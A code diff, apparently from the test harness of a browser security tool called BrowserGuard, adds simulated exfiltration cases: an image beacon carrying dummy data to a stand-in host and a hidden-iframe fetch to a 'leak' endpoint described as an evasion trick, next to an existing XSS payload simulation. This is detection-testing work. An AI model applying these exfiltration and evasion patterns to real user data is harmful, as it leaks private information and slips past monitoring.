@@ -63,6 +63,20 @@ export const Simulations: Record<string, () => void> = {
     } as typeof window.setTimeout;
   },
 
+  "exfil-image": () => {
+    // Patrón típico: los datos viajan en la query de una imagen hacia otro origen.
+    new Image().src = `https://pixel.unknown.example/p.gif?d=${"x".repeat(120)}`;
+  },
+
+  "exfil-iframe": () => {
+    // Evasión clásica: usar el fetch de un iframe vacío. BrowserGuard lo observa igual.
+    const frame = document.createElement("iframe");
+    frame.style.display = "none";
+    document.body.appendChild(frame);
+    void frame.contentWindow?.fetch("https://collector.unknown.example/leak").catch(Ignore);
+    frame.remove();
+  },
+
   "xss-innerhtml": () => {
     // Payload clásico; el src inválido dispara onerror, que solo escribe en consola.
     const container = document.createElement("div");
